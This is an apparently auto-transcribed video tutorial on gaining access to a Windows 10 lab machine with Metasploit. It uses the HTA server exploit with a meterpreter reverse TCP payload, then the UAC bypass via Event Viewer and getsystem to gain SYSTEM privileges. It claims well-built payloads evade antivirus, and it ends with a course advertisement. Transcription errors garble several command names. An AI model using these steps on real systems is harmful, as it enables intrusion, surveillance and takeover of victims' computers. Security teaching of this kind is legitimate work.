time to start it up
now the Metasploit console has been
loaded
from here we can decide what type of
attack we want to launch and what kind
of exploits we can launch against
vulnerable targets for example like we
already discussed I'm running this
virtual machine on a Windows 10 host
machine so if I open the command prompt
from my Windows 10 over here
if I need to check the IP address once I
go with ipconfig
here you can see the IP address of this
local machine
moving on
if we have to attack that machine let's
say we want to see what kind of exploits
are going to work over there
now we already know that Windows has
some common vulnerabilities one of those
vulnerabilities is the HTA server
vulnerability HTA is supposed to be a
HTML application but when past the right
payload it can be used to open a back
door into a system
to start off with the Metasploit and
accessing such applications
we're going to use the command use
exploit and the name of the reverse HTA
server is this windows
for miscellaneous
HDA server
as you can see it already found this one
all right now there are some options
that we need to set for this exploit to
go through for example you can see some
of the options over here there is a
payload the payload is supposed to be
the malicious file that we are going to
send on the HTML application which
allows us to give the back door
for example right now the payload which
is the malicious file is a Windows meter
printer reverse TCP
completely understandable now let's set
the L host
L host and R host and SRV host should be
the one where we are going to launch the
attack from for example if we launched
another tab of this console
and we just press i f config
the IP address is 192 plus 168 72130
so we're going to set the L host as
192.168.72.130
and we're going to do the same thing
with SRV host
we're going to set up port
where we need to capture the back door
axis
next the payload has already been set
this payload will launch a back door and
give us meta prita access to the system
metopriter is can be considered as an
upgrade of a normal command prompt shell
we will look into it once we get the
access in the first place
now that we have set the commands we can
press on exploit and press enter
now you can see we have a URL over here
we're going to copy this URL
once the URL is copied we take it into
the browser and paste it
this will ask us to download this file
now as per browser security settings
this file should be blocked by default
we can decide to keep it and with the
correct formulation of this malicious
package even the website browser
antivirus softwares will not be able to
detect good payloads we're going to save
this file
and we're going to open it
publisher could not be verified if we
press run and we go back to our Meetup
beta access over here
you can see it has already captured the
URL of an HD server and it is writing
delivering payload
just have to wait for a few seconds so
the payload is delivered
it has sent this much amount of data
meter Peter session one is opened
and we should get the access soon
there we go now to understand where is
the session set
we can write sessions minus I
as you can see it has a meter beta over
here we're going to write sessions minus
I
recession ID is 1 so we're going to
write 1. and we have the meter beta
access now to get a fair idea of the
system
we're going to write this info and it's
going to the computer name the OS
architecture all these things we can
write the help command to see what are
the things that we can get out of the
system we can take screenshots we can
control the webcam and start a video
chat
we can take a lot of things over here
there are other commands as well where
we can change the file directory like
the cad command CD command there are so
many things that work in the normal CMD
which we can run on the meter beta as
well now if you want to access this
command prompt of the system directly we
can go with this we have to write shell
and there we go we are in the downloads
folder right now to see if this is the
same computer or not we're going to
write ipconfig
as you can see it is our victim machine
with 192.168 or 29.171 we can just press
exit and we're back with the meter beta
access
this is how we can use metafreter and
Metasploit to gain access to a Windows
10 machine next let's take a look at how
we can get to root access from a Windows
10 system
we just learned how we can get a meter
beta access from a system
we can background this meter Builder
session by writing background and
pressing enter
we can still we can still see the shares
sessions minus I it's still present over
here
now
these kind of access are not
administrative access these are the kind
of back doors that can be created for
standard users but to get a complete
access of a system including the program
files the windows documents we need to
have root access or administrative
access
through that we're going to use another
exploit
reminder that the meter Peter session of
the standard access is already present
and we're not messing with it right now
we're going to set up another session
albeit with the same machine
that exploit name is
use exploit windows
local
bypass USC
Event Viewer
and there we go now if we check the
options that we can put in the system
we have to choose an exploit Target
we need to put a session as well
let's say we going to use the session
one this is the session that has the
meter beta access with the standard user
it doesn't have the system user
we're going to write
set Session One
and we're going to run export run a few
commands and it opened a second meter
beta session
as you can see it is the assessment too
if I write this info
we can still see I am not the
system user right now I'm still just a
normal user how can we check that
if you go to Shell
Excel CC users canopy downloads all
these things
if I press exit go back to the meter
bitter there is a command on meter beta
get system it attempts to elevate your
privilege to that of the local system
which basically means you get promoted
into root access so if we write get
system
and due to pipe impersonation we now
have the system root access
as you can see now it has become x64 and
we are the admin users now if I go to
Shell
I can easily go back
windows
and I can easily access these ones
this kind of control over the windows
folders and the program files folders
these kind of things are not possible if
you are not an admin access or the
command prompt has not been run with
admin permissions this is how we can use
privilege escalation to get into an
admin access system
we use the second exploit which was the
bypass us Event Viewer exploit
and essentially used to do the first
session as you can read here Windows
escalation USA protection bypass
it was first disclosed on 2016 but it
still works on some systems
this is how we can get a root access on
a Windows 10 installation
hope you learned something new today if
you have any doubts regarding the topic
mentioned in the lesson
please feel free to let us know in the
comment section below staying ahead in
your career requires continuous learning
and upskilling whether you're a student
aiming to learn today's top skills or a
working professional looking to advance
your career we've got you covered
explore our impressive catalog of
certification programs in Cutting Edge
domains including data science cloud
computing cyber security AI machine
learning or digital marketing designed
in collaboration with leading
universities and top corporations and
delivered by industry experts choose any
of our programs and set yourself on the
path to Career Success click the link in
the description to know more
foreign
hi there if you like this video
subscribe to the simply learning YouTube
channel and click here to watch similar
videos to nerd up and get certified
click here